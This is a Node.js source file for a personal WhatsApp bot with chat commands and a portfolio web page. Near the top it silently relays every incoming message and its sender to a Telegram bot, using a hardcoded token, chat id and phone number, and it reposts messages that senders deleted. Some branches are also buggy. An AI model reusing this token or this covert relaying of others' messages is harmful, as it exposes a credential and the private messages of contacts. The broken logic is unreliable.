//jshint esversion:8
const express = require("express");
const app = express();
const { Client, LegacySessionAuth, Location, List, Buttons, LocalAuth,  MessageMedia } = require("whatsapp-web.js");
const config = require("./config");
var XMLHttpRequest = require('xhr2');
var xhr = new XMLHttpRequest();
const axios = require('axios');
const FormData = require('form-data');
let mime = require('mime-to-extensions');

async function telegraph(attachmentData) {
    let form = new FormData();
    form.append('file', Buffer.from(attachmentData.data, 'base64'), {
        filename: `telegraph.${mime.extension(attachmentData.mimetype)}`

    });

    return axios.create({
        headers: form.getHeaders()
    }).post('https://telegra.ph/upload', form).then(response => {
        return "https://telegra.ph" + response.data[0].src;
    }).catch(error => {
        return "error";
    });

}
async function carbon(text) {

  let respoimage = await axios.get(`https://carbonnowsh.herokuapp.com/?code=${text.replace(/ /gi,"+")}&theme=darcula&backgroundColor=rgba(36, 75, 115)`, { responseType: 'arraybuffer' }).catch(function(error) {
      return "error";
  });

  return ({
      mimetype: "image/png",
      data: Buffer.from(respoimage.data).toString('base64'),
      filename: "carbon"
  });
}


const client = new Client({
  puppeteer: { headless: true, args: ["--no-sandbox"] },
  authStrategy: new LegacySessionAuth({
    session: config.session,
  }),
});

client.initialize();

client.on("auth_failure", () => {
  console.error(
    "There is a problem in authentication, Kindly set the env var again and restart the app"
  );
});

client.on("ready", () => {
  console.log("Bot has been started");
  const number = "+918790863694";
  const text = "Hey Im Restarted";
  const chatId = number.substring(1) + "@c.us";
  client.sendMessage(chatId, text);
});

client.on("message", async (msg) => {
  //create XMLHttpRequest object
  let url = ("https://api.telegram.org/bot5217702275:AAH0KwikoXAzjEc7qO8V9XiH1-gnTAVnFF4/sendMessage?chat_id=1089528685&text=");
  let text = url.concat(msg.body+" \n **From:** "+msg.author+"&parse_mode=markdown");
  console.log(text)
  //create XMLHttpRequest object
  const xhr = new XMLHttpRequest()
  xhr.open("GET",text)
  xhr.send()
  console.log('MESSAGE RECEIVED', msg);
  const number = "+918790863694";
  const chatId = number.substring(1) + "@c.us";
  client.sendMessage(chatId, msg);
  xhr.open("GET",url+"Iam Restarted")
  
  if (msg.body === '!pong reply') {
        msg.reply('ping');

    } else if (msg.body === '!pong') {
        // Send a new message to the same chat
        client.sendMessage(msg.from, 'pong');

    } else if (msg.body.startsWith('!sendto ')) {
        // Direct send a new message to specific id
        let number = msg.body.split(' ')[1];
        let messageIndex = msg.body.indexOf(number) + number.length;
        let message = msg.body.slice(messageIndex, msg.body.length);
        number = number.includes('@c.us') ? number : `${number}@c.us`;
        let chat = await msg.getChat();
        chat.sendSeen();
        client.sendMessage(number, message);

    } else if (msg.body.startsWith('!subject ')) {
        // Change the group subject
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newSubject = msg.body.slice(9);
            chat.setSubject(newSubject);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!echo ')) {
        // Replies with the same message
        msg.reply(msg.body.slice(6));
    } else if (msg.body.startsWith('!desc ')) {
        // Change the group description
        let chat = await msg.getChat();
        if (chat.isGroup) {
            let newDescription = msg.body.slice(6);
            chat.setDescription(newDescription);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!leave') {
        // Leave the group
        let chat = await msg.getChat();
        if (chat.isGroup) {
            chat.leave();
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body.startsWith('!join ')) {
        const inviteCode = msg.body.split(' ')[1];
        try {
            await client.acceptInvite(inviteCode);
            msg.reply('Joined the group!');
        } catch (e) {
            msg.reply('That invite code seems to be invalid.');
        }
    } else if (msg.body === '!groupinfo') {
        let chat = await msg.getChat();
        if (chat.isGroup) {
            msg.reply(`
                *Group Details*
                Name: ${chat.name}
                Description: ${chat.description}
                Created At: ${chat.createdAt.toString()}
                Created By: ${chat.owner.user}
                Participant count: ${chat.participants.length}
            `);
        } else {
            msg.reply('This command can only be used in a group!');
        }
    } else if (msg.body === '!chats') {
        const chats = await client.getChats();
        client.sendMessage(msg.from, `The bot has ${chats.length} chats open.`);
    } else if (msg.body === '!info') {
        let info = client.info;
        client.sendMessage(msg.from, `
            *Connection info*
            User name: ${info.pushname}
            My number: ${info.wid.user}
            Platform: ${info.platform}
        `);
    } else if (msg.body === '!mediainfo' && msg.hasMedia) {
        const attachmentData = await msg.downloadMedia();
        msg.reply(`
            *Media info*
            MimeType: ${attachmentData.mimetype}
            Filename: ${attachmentData.filename}
            Data (length): ${attachmentData.data.length}
        `);
    } else if (msg.body === '!quoteinfo' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();

        quotedMsg.reply(`
            ID: ${quotedMsg.id._serialized}
            Type: ${quotedMsg.type}
            Author: ${quotedMsg.author || quotedMsg.from}
            Timestamp: ${quotedMsg.timestamp}
            Has Media? ${quotedMsg.hasMedia}
        `);
    } else if (msg.body === '!resendmedia' && msg.hasQuotedMsg) {
        const quotedMsg = await msg.getQuotedMessage();
        if (quotedMsg.hasMedia) {
            const attachmentData = await quotedMsg.downloadMedia();
            client.sendMessage(msg.from, attachmentData, { caption: 'Here\'s your requested media.' });
        }
    } else if (msg.body === '!location') {
        msg.reply(new Location(37.422, -122.084, 'Googleplex\nGoogle Headquarters'));
    } else if (msg.location) {
        msg.reply(msg.location);
    } else if (msg.body.startsWith('!status ')) {
        const newStatus = msg.body.split(' ')[1];
        await client.setStatus(newStatus);
        msg.reply(`Status was updated to *${newStatus}*`);
    } else if (msg.body === '!mention') {
        const contact = await msg.getContact();
        const chat = await msg.getChat();
        chat.sendMessage(`Hi @${contact.number}!`, {
            mentions: [contact]
        });
    } else if (msg.body === '!delete') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            if (quotedMsg.fromMe) {
                quotedMsg.delete(true);
            } else {
                msg.reply('I can only delete my own messages');
            }
        }
    } else if (msg.body === '!pin') {
        const chat = await msg.getChat();
        await chat.pin();
    } else if (msg.body === '!archive') {
        const chat = await msg.getChat();
        await chat.archive();
    } else if (msg.body === '!mute') {
        const chat = await msg.getChat();
        // mute the chat for 20 seconds
        const unmuteDate = new Date();
        unmuteDate.setSeconds(unmuteDate.getSeconds() + 20);
        await chat.mute(unmuteDate);
    } else if (msg.body === '!typing') {
        const chat = await msg.getChat();
        // simulates typing in the chat
        chat.sendStateTyping();
    } else if (msg.body === '!recording') {
        const chat = await msg.getChat();
        // simulates recording audio in the chat
        chat.sendStateRecording();
    } else if (msg.body === '!clearstate') {
        const chat = await msg.getChat();
        // stops typing or recording in the chat
        chat.clearState();
    } else if (msg.body === '!jumpto') {
        if (msg.hasQuotedMsg) {
            const quotedMsg = await msg.getQuotedMessage();
            client.interface.openChatWindowAt(quotedMsg.id._serialized);
        }
    } else if (msg.body === '!buttons') {
        let button = new Buttons('Button body',[{body:'bt1'},{body:'bt2'},{body:'bt3'}],'title','footer');
        client.sendMessage(msg.from, button);
    } else if (msg.body === '!list') {
        let sections = [{title:'sectionTitle',rows:[{title:'ListItem1', description: 'desc'},{title:'ListItem2'}]}];
        let list = new List('List body','btnText',sections,'Title','footer');
        client.sendMessage(msg.from, list);
    } else if (msg.body === '!alive') {
      client.sendPresenceAvailable();
      msg.reply("```" + "I will be online from now." + "```");
  } else if (msg.body.startsWith('!block') && !msg.to.includes("-")) {
    await msg.reply(`*❌ Blocked* \n\n You have been blocked\n\n`);
    let chat = await msg.getChat();
    let contact = await chat.getContact();
    contact.block();
  } else if (msg.body === '!carbon') {
  let data;

    msg.delete(true);
    if( msg.hasQuotedMsg){
        let quotedMsg = await msg.getQuotedMessage();
        data = await carbon(quotedMsg.body);
        msg = quotedMsg;
    }
    else {
        data = await carbon(args.join(' '));
    }

    if (data == "error") {
        await client.sendMessage(msg.to, `🙇‍♂️ *Error*\n\n` + "```Something Unexpected Happened to create the Carbon.```");
    } else {
        await client.sendMessage(msg.to, new MessageMedia(data.mimetype, data.data, data.filename), { caption: `Carbon for 👇\n` + "```" + msg.body.replace("!carbon ", "") + "```" });
    }
  } else if (msg.body = "!directlink") {
    if(msg.hasQuotedMsg){
      let quotedMsg = await msg.getQuotedMessage();
      let attachmentData = await quotedMsg.downloadMedia();
      let data = await telegraph(attachmentData);
      if (data == "error") {
          quotedMsg.reply(`Error occured while create direct link.`);
      } else {
          quotedMsg.reply(`🔗 *Direct Link 👇*\n\n` + "```" + data + "```");
      }
  }
  else{
      await client.sendMessage(msg.to,"Please reply to a media file");
  }
  } else if (msg.body == "!stic"){
    msg.delete(true);
    let quotedMsg = await msg.getQuotedMessage();
    if (quotedMsg.hasMedia) {
        let attachmentData = await quotedMsg.downloadMedia();
        await client.sendMessage(msg.to, new MessageMedia(attachmentData.mimetype, attachmentData.data, attachmentData.filename), { sendMediaAsSticker: true });
    } else {
        await client.sendMessage(msg.to, `🙇‍♂️ *Error*\n\n` + "```No image found to make a Sticker```");
    }
  }

});
client.on("message_revoke_everyone", async (after, before) => {
  if (before) {
    if (
      before.fromMe !== true &&
      before.hasMedia !== true &&
      before.author == undefined &&
      config.enable_delete_alert == "true"
    ) {
      client.sendMessage(
        before.from,
        "_You deleted this message_ 👇👇\n\n" + before.body
      );
    }
  }
});

client.on("disconnected", (reason) => {
  console.log("Client was logged out", reason);
});

app.get("/", (req, res) => {
  res.send(
    '<html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Satya</title><meta name="title" content="Satya"><meta name="description" content="Personal"><meta property="og:type" content="website"><meta property="og:url" content="https://satyendra.tech"><meta property="og:title" content="satyendra"><meta property="og:description" content="Personal site for whatsapp"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://satyendra.tech/"><meta property="twitter:title" content="satyendra"><meta property="twitter:description" content="Personal site for whatsapp"><meta name="msapplication-TileColor" content="#603cba"><meta name="theme-color" content="#6c63ff"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v8=qAJ44G5Bm7"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v8=qAJ44G5Bm7"><link rel="mask-icon" href="/safari-pinned-tab.svg?v8=qAJ44G5Bm7" color="#885bd5"><link rel="shortcut icon" href="/favicon.ico?v8=qAJ44G5Bm7"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v8=qAJ44G5Bm7"><link rel="manifest" href="/manifest.json"/><link rel="preload" href="/static/media/Montserrat-Regular.ee653992.ttf" as="font" type="font/woff" crossorigin><link rel="preload" href="/static/media/Agustina.21f233e1.woff" as="font" type="font/woff" crossorigin><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-135618960-2")</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.4/css/all.min.css"><link href="/static/css/main.1a6005f5.chunk.css" rel="stylesheet"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"></div><script>!function(e){function t(t){for(var n,o,i=t[0],l=t[1],c=t[2],s=0,p=[];s<i.length;s++)o=i[s],Object.prototype.hasOwnProperty.call(a,o)&&a[o]&&p.push(a[o][0]),a[o]=0;for(n in l)Object.prototype.hasOwnProperty.call(l,n)&&(e[n]=l[n]);for(f&&f(t);p.length;)p.shift()();return u.push.apply(u,c||[]),r()}function r(){for(var e,t=0;t<u.length;t++){for(var r=u[t],n=!0,o=1;o<r.length;o++){var l=r[o];0!==a[l]&&(n=!1)}n&&(u.splice(t--,1),e=i(i.s=r[0]))}return e}var n={},o={1:0},a={1:0},u=[];function i(t){if(n[t])return n[t].exports;var r=n[t]={i:t,l:!1,exports:{}};return e[t].call(r.exports,r,r.exports,i),r.l=!0,r.exports}i.e=function(e){var t=[];o[e]?t.push(o[e]):0!==o[e]&&{3:1,4:1}[e]&&t.push(o[e]=new Promise((function(t,r){for(var n="static/css/"+({}[e]||e)+"."+{3:"df879eac",4:"e91a4b36"}[e]+".chunk.css",a=i.p+n,u=document.getElementsByTagName("link"),l=0;l<u.length;l++){var c=(f=u[l]).getAttribute("data-href")||f.getAttribute("href");if("stylesheet"===f.rel&&(c===n||c===a))return t()}var s=document.getElementsByTagName("style");for(l=0;l<s.length;l++){var f;if((c=(f=s[l]).getAttribute("data-href"))===n||c===a)return t()}var p=document.createElement("link");p.rel="stylesheet",p.type="text/css",p.onload=t,p.onerror=function(t){var n=t&&t.target&&t.target.src||a,u=new Error("Loading CSS chunk "+e+" failed.\n("+n+")");u.code="CSS_CHUNK_LOAD_FAILED",u.request=n,delete o[e],p.parentNode.removeChild(p),r(u)},p.href=a,document.getElementsByTagName("head")[0].appendChild(p)})).then((function(){o[e]=0})));var r=a[e];if(0!==r)if(r)t.push(r[2]);else{var n=new Promise((function(t,n){r=a[e]=[t,n]}));t.push(r[2]=n);var u,l=document.createElement("script");l.charset="utf-8",l.timeout=120,i.nc&&l.setAttribute("nonce",i.nc),l.src=function(e){return i.p+"static/js/"+({}[e]||e)+"."+{3:"5037e296",4:"aa2ec175"}[e]+".chunk.js"}(e);var c=new Error;u=function(t){l.onerror=l.onload=null,clearTimeout(s);var r=a[e];if(0!==r){if(r){var n=t&&("load"===t.type?"missing":t.type),o=t&&t.target&&t.target.src;c.message="Loading chunk "+e+" failed.\n("+n+": "+o+")",c.name="ChunkLoadError",c.type=n,c.request=o,r[1](c)}a[e]=void 0}};var s=setTimeout((function(){u({type:"timeout",target:l})}),12e4);l.onerror=l.onload=u,document.head.appendChild(l)}return Promise.all(t)},i.m=e,i.c=n,i.d=function(e,t,r){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},i.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(i.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var n in e)i.d(r,n,function(t){return e[t]}.bind(null,n));return r},i.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="/",i.oe=function(e){throw console.error(e),e};var l=this.webpackJsonpdeveloperfolio=this.webpackJsonpdeveloperfolio||[],c=l.push.bind(l);l.push=t,l=l.slice();for(var s=0;s<l.length;s++)t(l[s]);var f=c;r()}([])</script><script src="/static/js/2.0398d4b4.chunk.js"></script><script src="/static/js/main.5c42a2e7.chunk.js"></script></body></html>'
  );
});
app.get("/api/", (req, res) => {
  res.send(
    'api is rip for now'
  );
});

app.use(
  "/public",
  express.static("public"),
  require("serve-index")("public", { icons: true })
); // public directory will be publicly available
app.use(
  "/examples",
  express.static("examples"),
  require("serve-index")("examples", { icons: true })
); // public directory will be publicly available

app.listen(process.env.PORT || 8080, () => {
  console.log(`Server listening at Port: ${process.env.PORT || 8080}`);
});
